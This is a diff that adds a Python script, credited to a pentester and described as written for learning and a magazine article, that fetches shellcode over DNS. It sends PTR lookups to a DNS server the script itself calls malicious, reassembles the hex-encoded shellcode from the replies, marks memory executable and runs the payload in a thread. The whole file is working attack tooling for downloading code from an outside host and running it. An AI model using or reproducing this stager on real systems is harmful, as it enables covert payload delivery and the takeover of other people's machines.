@@ -1,0 +1,63 @@
+#!/usr/bin/env python
+# Author: Boumediene KADDOUR - OSCP, OSWP
+# Created for learning purposes and Pentest Magazine article contribution
+# Transfering shellcode via DNS, the utility will perform a reverse lookup looking for
+# IP resolution to a malicious DNS, that will send portions of shellcode in a domain name format.
+
+from struct import unpack
+from ctypes import CDLL,c_char_p,c_void_p,memmove,CFUNCTYPE,cast
+from thread import start_new_thread
+from binascii import hexlify
+from scapy.all import *
+import logging 
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
+payload = ""
+
+class DNSFetcher:
+	def __init__(self ):
+                self.PROT_READ = 1
+                self.PROT_WRITE = 2
+                self.PROT_EXEC = 4
+        def shellExec(self,buffer):
+            libc = CDLL('libc.so.6')
+            buf = c_char_p(buffer)
+            size = len(buffer)
+            addr = libc.valloc(size)
+            addr = c_void_p(addr)
+            if 0 == addr:  
+                raise Exception("Failed to allocate memory")
+            memmove(addr, buffer, size)
+            if 0 != libc.mprotect(addr, len(buffer), self.PROT_READ | self.PROT_WRITE | self.PROT_EXEC):
+                raise Exception("Failed to set protection on buffer")
+            return addr
+
+
+        def run(self, DNS_SRV=None, RECORD=None,):
+            global payload
+            for portion in range(140,152):
+		print "Fetching PTR of %s"%portion
+                ans,unans = sr(IP(dst=DNS_SRV)/UDP()/DNS(rd=1,qd=DNSQR(qname="%s.1.168.192.in-addr.arpa"%portion, qtype=RECORD)), verbose=False)
+                payload_chunks = ans[0][1][DNS].summary( lambda(s,r): r.sprintf("%DNSRR.rdata% : %DNSRR.type%") )
+                payload += payload_chunks.split("0x")[1].split(".")[0]
+	    print payload
+            memorywithshell = self.shellExec("".join(chr(int(payload[i:i+2],16)) for i in xrange(0,len(payload),2)))
+            shell = cast(memorywithshell, CFUNCTYPE(c_void_p))
+	    start_new_thread(shell(),())
+
+
+
+
+def main():
+    fetcher = DNSFetcher()
+    fetcher.run("192.168.102", "PTR")
+
+try:
+	if __name__ == "__main__":
+    		main()
+except KeyboardInterrupt:
+	exit()
+
+
+
+
